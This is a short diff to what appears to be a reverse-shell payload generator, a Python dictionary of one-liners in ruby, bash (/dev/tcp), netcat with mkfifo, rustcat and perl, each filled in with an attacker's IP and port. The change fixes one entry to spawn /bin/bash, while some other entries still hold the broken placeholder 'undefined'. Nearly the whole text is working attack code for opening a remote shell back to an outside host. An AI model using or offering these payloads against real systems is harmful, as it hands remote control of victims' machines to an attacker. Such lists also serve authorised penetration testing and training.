@@ -78,7 +78,7 @@ shell_commands = {
     "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
     "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
     "bash": "bash -i >& /dev/tcp/{}/{} 0>&1".format(IP, PORT),
-    "mfikto": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|undefined -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
+    "mfikto": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
     "netcat": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
     "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (IP, PORT),
     "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\'' % (IP, PORT),
